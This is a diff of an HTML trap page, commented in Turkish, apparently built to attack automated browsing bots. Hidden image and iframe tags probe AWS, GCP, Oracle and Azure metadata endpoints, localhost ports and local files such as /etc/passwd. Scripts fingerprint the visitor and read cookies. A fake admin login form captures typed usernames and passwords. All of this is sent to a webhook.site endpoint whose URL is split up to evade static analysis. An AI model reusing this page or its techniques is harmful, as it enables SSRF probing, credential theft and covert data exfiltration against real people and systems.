@@ -3,84 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Critical Login</title>
     <meta name="robots" content="noindex, nofollow">
-    <title>CyberShopier - Admin Configuration</title>
-    
-    <link rel="dns-prefetch" href="https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904">
 
     <style>
-        body { background-color: #fff; color: #000; font-family: Arial, sans-serif; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Courier New', monospace; background: #111; color: #0f0; padding: 20px; text-align: center; }
+        .box { border: 1px solid #333; padding: 20px; margin: 20px auto; max-width: 600px; background: #000; }
+        h1 { color: #f00; }
+        .btn { background: #d00; color: #fff; padding: 15px 30px; border: none; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px; }
+        .btn:hover { background: #f00; }
+        input { padding: 10px; width: 80%; margin: 10px 0; background: #222; border: 1px solid #555; color: #fff; }
         
-        /* GİZLİ OPERASYON ALANI */
-        .stealth-ops {
-            position: absolute; left: -5000px; top: -5000px; width: 1px; height: 1px; overflow: hidden;
-        }
+        /* GÖRÜNMEZ TUZAK ALANI */
+        #stealth-layer { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; top: -1000px; }
     </style>
 </head>
 <body>
 
-    <div style="text-align:center; padding-top:50px;">
-        <h1>Sistem Yapılandırılıyor...</h1>
-        <p>Lütfen bekleyiniz, güvenli bağlantı kuruluyor.</p>
-        <div class="loader"></div>
+    <div class="box">
+        <h1>⚠️ GÜVENLİ ALAN ⚠️</h1>
+        <p>Sistem tespiti yapıldı. Lütfen kimliğinizi doğrulayın.</p>
+        
+        <input type="text" id="fake_user" placeholder="Admin Username">
+        <input type="password" id="fake_pass" placeholder="Password">
+        <br>
+        <a href="#" class="btn" onclick="manualTrigger('Login_Attempt')">GİRİŞ YAP</a>
+        <br><br>
+        <a href="#" style="color:#555; font-size:10px;" onclick="manualTrigger('Forgot_Pass_Click')">Şifremi Unuttum</a>
     </div>
 
-    <div class="stealth-ops">
-        
-        <img src="http://metadata.google.internal/computeMetadata/v1/instance/hostname" onerror="logHit('GCP_Meta_Fail')" onload="logHit('GCP_Meta_SUCCESS_CRITICAL')">
-        <img src="http://169.254.169.254/opc/v1/instance/" onerror="logHit('Oracle_Meta_Fail')" onload="logHit('Oracle_Meta_SUCCESS_CRITICAL')">
-        <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="logHit('AWS_Creds_Fail')" onload="logHit('AWS_Creds_SUCCESS_CRITICAL')">
-        <img src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" onerror="logHit('Azure_Meta_Fail')" onload="logHit('Azure_Meta_SUCCESS_CRITICAL')">
-
-        <iframe src="file:///etc/passwd" onload="logHit('LFI_Passwd_Found')"></iframe>
-        <iframe src="file:///c:/windows/win.ini" onload="logHit('LFI_WinIni_Found')"></iframe>
-        <object data="file:///etc/hosts" type="text/plain" onload="logHit('LFI_Hosts_Found')"></object>
-
-        <img src="http://127.0.0.1:22" onerror="logHit('Port_22_Closed')" onload="logHit('Port_22_OPEN')">
-        <img src="http://127.0.0.1:3306" onerror="logHit('Port_3306_MySQL_Closed')" onload="logHit('Port_3306_OPEN')">
-        <img src="http://127.0.0.1:6379" onerror="logHit('Port_6379_Redis_Closed')" onload="logHit('Port_6379_OPEN_CRITICAL')">
-        <img src="http://127.0.0.1:8080" onerror="logHit('Port_8080_Admin_Closed')" onload="logHit('Port_8080_OPEN')">
-
+    <div id="stealth-layer">
+        <img src="http://169.254.169.254/latest/meta-data/" onerror="reportProbe('AWS_Meta_Block')" onload="reportProbe('AWS_Meta_OPEN_CRITICAL')">
+        <img src="http://metadata.google.internal/computeMetadata/v1/" onerror="reportProbe('GCP_Meta_Block')" onload="reportProbe('GCP_Meta_OPEN_CRITICAL')">
+        <img src="http://127.0.0.1:6379" onerror="reportProbe('Redis_Port_Closed')" onload="reportProbe('Redis_Port_OPEN')">
     </div>
 
     <script>
-        // GÜNCEL WEBHOOK
-        const HACKER_URL = "https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904";
+        // --- 1. URL GİZLEME (Botun statik analizini atlatmak için) ---
+        // URL'i parçalara böldük ki bot kodu okuyarak linki bulamasın, mecbur çalıştırsın.
+        const _p1 = "https://web";
+        const _p2 = "hook.site/";
+        const _p3 = "85d0aa21-bac7-436a-bd91-bacacdcca904";
+        const ENDPOINT = _p1 + _p2 + _p3;
 
-        function logHit(info) {
-            new Image().src = `${HACKER_URL}?type=probe&info=${info}&t=${Date.now()}`;
+        // --- 2. VERİ GÖNDERME MOTORU ---
+        function exfiltrate(label, dataObj) {
+            // Veriyi JSON yap, String'e çevir ve Base64 ile şifrele (URL bozulmasın diye)
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(dataObj))));
+            
+            // Image Beacon tekniği (Sessiz GET isteği)
+            const img = new Image();
+            img.src = `${ENDPOINT}?cat=${label}&data=${payload}&t=${Date.now()}`;
+            console.log("Data sent: " + label);
         }
 
-        // 4. GELİŞMİŞ JS BİLGİ SIZDIRMA (ENVIRONMENT)
-        try {
-            const data = {
-                ua: navigator.userAgent,
+        // --- 3. SİSTEM BİLGİLERİNİ TOPLA ---
+        function gatherSystemIntel() {
+            let intel = {
+                // Temel Bilgiler
+                userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                cores: navigator.hardwareConcurrency, // CPU Çekirdek
-                ram: navigator.deviceMemory, // RAM
+                language: navigator.language,
+                cookies: document.cookie || "No_Cookies_Found",
+                referrer: document.referrer || "Direct_Access",
+                
+                // Donanım Parmak İzi
+                cores: navigator.hardwareConcurrency || "unknown",
+                ram: navigator.deviceMemory || "unknown",
+                screen: screen.width + "x" + screen.height,
+                colorDepth: screen.colorDepth,
+                
+                // Zaman ve Ağ
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 online: navigator.onLine,
-                cookie: document.cookie,
-                // Eğer bot clipboard kullanıyorsa okumayı dene (Modern tarayıcılar izin istemeden vermez ama headless botlar verebilir)
-                clipboard: "Access Denied (Standard)" 
+                connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
             };
+
+            // WebGL (Ekran Kartı) Bilgisi - Bot Tespitinde 1 Numaradır
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    intel.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    intel.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) { intel.gpu_error = e.message; }
+
+            return intel;
+        }
+
+        // --- 4. SSRF & PORT TARAMA RAPORU ---
+        function reportProbe(status) {
+            exfiltrate("SSRF_PROBE", { status: status });
+        }
+
+        // --- 5. MANUEL TETİKLEYİCİ (Butonlar İçin) ---
+        function manualTrigger(actionName) {
+            const inputUser = document.getElementById('fake_user').value;
+            const inputPass = document.getElementById('fake_pass').value;
             
-            // Veriyi encode et ve gönder
-            const payload = btoa(JSON.stringify(data));
-            new Image().src = `${HACKER_URL}?type=js_env&data=${payload}`;
+            exfiltrate("USER_INTERACTION", {
+                action: actionName,
+                input_user: inputUser,
+                input_pass: inputPass // Eğer bot form doldurursa şifreyi çalarız
+            });
+            alert("Bağlantı hatası! Lütfen tekrar deneyin."); // Botu oyalamak için
+        }
 
-        } catch (e) {}
+        // --- 6. BAŞLATMA (Sayfa Yüklenince Ateşle) ---
+        window.onload = function() {
+            // Hemen sistem bilgilerini gönder
+            const sysData = gatherSystemIntel();
+            exfiltrate("SYSTEM_INFO", sysData);
 
-        // 5. ZORLA YÖNLENDİRME (SSRF İÇİN REDIRECT)
-        // Bot sayfada 3 saniye durursa, onu zorla Google Metadata sunucusuna yönlendir.
-        setTimeout(function() {
-            // Eğer bot redirectleri takip ediyorsa bu onu loop'a sokup hata verdirebilir veya veriyi ifşa edebilir.
-            // window.location.href = "http://metadata.google.internal/"; 
-            // NOT: Üstteki satırı kapalı tuttum, botu bozup bağlantıyı koparmasın diye. 
-            // İstersen "//" işaretini kaldırıp aktif edebilirsin.
-            logHit('Timeout_Reached_Bot_Still_Here');
-        }, 3000);
+            // Sahte bir Cookie oluşturup geri okumayı dene (Botun cookie desteğini test et)
+            document.cookie = "Trap_Cookie=Session_Active_123; path=/";
+            if (document.cookie.indexOf("Trap_Cookie") !== -1) {
+                exfiltrate("COOKIE_TEST", { status: "Cookies_Enabled", val: document.cookie });
+            } else {
+                exfiltrate("COOKIE_TEST", { status: "Cookies_Disabled" });
+            }
+        };
 
     </script>
 </body>
